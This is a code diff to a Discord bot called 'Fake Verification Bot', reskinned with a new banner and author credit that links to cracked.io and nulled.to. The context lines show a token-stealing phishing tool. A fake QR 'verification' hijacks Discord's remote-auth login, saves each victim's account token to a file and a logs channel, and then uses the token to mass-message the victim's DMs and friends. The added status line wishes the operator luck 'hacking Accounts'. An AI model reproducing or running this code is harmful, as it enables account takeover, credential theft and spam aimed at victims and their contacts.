@@ -46,13 +46,18 @@ def bot_title():
     os.system("cls" if os.name == "nt" else "clear")
     if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#1312")
     else: pass
-    print(f"""\n\n{Fore.RESET}                            â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
-                            â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•
-                            â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  
-                            â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•      â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  
-                            â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     
-                            â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•      â•šâ•â•â•â•  â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•\n""".replace('â–ˆ', f'{b}â–ˆ{y}'))
-    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
+    print("\n\n")
+    print(f"""{Fore.RESET}
+    \t\t\t███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗██╗ ██████╗ █████╗ ████████╗ ██████╗ ██████╗ 
+    \t\t\t██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝██║██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
+    \t\t\t█████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  ██║██║     ███████║   ██║   ██║   ██║██████╔╝
+    \t\t\t██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
+    \t\t\t██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     ██║╚██████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
+    \t\t\t╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
+                                                                                                         
+    print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+    print(f"\t{Fore.LIGHTWHITE_EX}https://discord.verify.gay | https://github.com/FuckingToasters | https://cracked.io/Infinimonster | https://nulled.to/Infinimonster | Infinimonster#1312\n")
+    print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))
 
 #Bot home page
 def startprint():
@@ -72,15 +77,16 @@ def startprint():
     else:
         mass_dm_texte = f"{Fore.RED}Disabled"
 
-    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
-                                                [#] Logged in as:    {bot.user.name}
-                                                [#] Bot ID:          {bot.user.id}
-                                                [#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
-                                                [#] Command Name:    {bot.command_prefix}{command_name}\n\n
-                                            {y}[{b}+{y}]{w} Settings View:\n
-                                                [#] Give Role:       {give_role_texte}
-                                                [#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
-    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")
+    print(f"""
+    \t\t\t\t\t\t{y}[{b}+{y}]{w} Bot Informations:\n
+    \t\t\t\t\t\t[#] Logged in as:    {bot.user.name}
+    \t\t\t\t\t\t[#] Bot ID:          {bot.user.id}
+    \t\t\t\t\t\t[#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
+    \t\t\t\t\t\t[#] Command Name:    {bot.command_prefix}{command_name}\n\n
+    \t\t\t\t\t\t{y}[{b}+{y}]{w} Settings View:\n
+    \t\t\t\t\t\t[#] Give Role:       {give_role_texte}
+    \t\t\t\t\t\t[#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
+    print(f"\t\t\t\t\t\t\t\t{y}[{Fore.GREEN}!{y}]{w} Bot is now Online! Wish u luck with hacking Accounts <3")
 
 intents = nextcord.Intents.default()
 intents.message_content = True
@@ -93,18 +99,18 @@ def Init():
     prefix = config.get('prefix')
     if botToken == "":
         bot_title()
-        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
+        input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
         return
     elif prefix == "":
         bot_title()
-        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
+        input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
         return
     try:
         bot.run(botToken)
     except:
         os.system("cls")
         bot_title()
-        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
+        input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
         return
 
 #Event initialization
@@ -223,7 +229,7 @@ async def start(ctx):
                 self._heartbeatTask.cancel()
     
                 if error:
-                    print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
+                    print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
                     self.initCrypto()
                     await self.run()
     
@@ -242,15 +248,15 @@ async def start(ctx):
         async def on_fingerprint(data):
             @c.event("on_cancel")
             async def on_cancel():
-                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
+                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
     
             @c.event("on_timeout")
             async def on_timeout():
-                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
+                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
     
             embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
             await interaction.edit_original_message(embed=embed_qr)
-            print(f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
+            print(f"\t\t\t\t\t\tâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
     
             @c.event("on_userdata")
             async def on_userdata(user):
@@ -266,7 +272,7 @@ async def start(ctx):
                 database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
     
                 json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
-                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
+                print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
     
                 @c.event("on_token")
                 async def on_token(token):
@@ -323,9 +329,9 @@ async def start(ctx):
                 
                     json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
 
-                    print(f"{y}[{b}#{y}]{w} Token: {token}")
+                    print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} Token: {token}")
                     if logs_channel:
-                        embed_user.set_footer(text="Made by Astraa#6100  ãƒ»  https://github.com/astraadev")
+                        embed_user.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
                         embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                         await logs_channel.send(embed=embed_user)
                     
@@ -333,14 +339,14 @@ async def start(ctx):
                     if give_role == True:
                         try:
                             await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
-                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
+                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                             if logs_channel:
                                 embed_role = nextcord.Embed(title=f"**Add Role Option:**", description=f"```yaml\nRole {role_name} added to {user.username}#{user.discriminator} with success!```", color=5003474)
-                                embed_role.set_footer(text="Made by Astraa#6100  ãƒ»  https://github.com/astraadev")
+                                embed_role.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
                                 embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_role)
                         except:
-                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")
+                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")
 
                     #If Enable, DM all the current person's private chat
                     if mass_dm == 1 or mass_dm == 3:
@@ -350,7 +356,7 @@ async def start(ctx):
                             channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
     
                             if not channel_id:
-                                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
+                                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
                             for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
                                 for channel2 in channel:
                                     for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
@@ -362,14 +368,14 @@ async def start(ctx):
                                             failures += 1
                                             sleep(.5)
                                             pass
-                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
+                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                             if logs_channel:
                                 embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
                                 embed_cdm.set_footer(text="Made by Astraa#6100  ãƒ»  https://github.com/astraadev")
                                 embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_cdm)
                         except Exception as e:
-                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
+                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                             pass
                     
                     #If active, DM all user's friends
@@ -388,16 +394,16 @@ async def start(ctx):
                                 sleep(.5)
 
                             if len(getfriends) == 0:
-                                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
+                                print(f"\t\t\t\t\t\t{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
                             else:
-                                print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
+                                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
                             if logs_channel:
                                 embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
                                 embed_fdm.set_footer(text="Made by Astraa#6100  ãƒ»  https://github.com/astraadev")
                                 embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_fdm)
                         except Exception as e:
-                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
+                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                             pass
         
         #Embed Creation
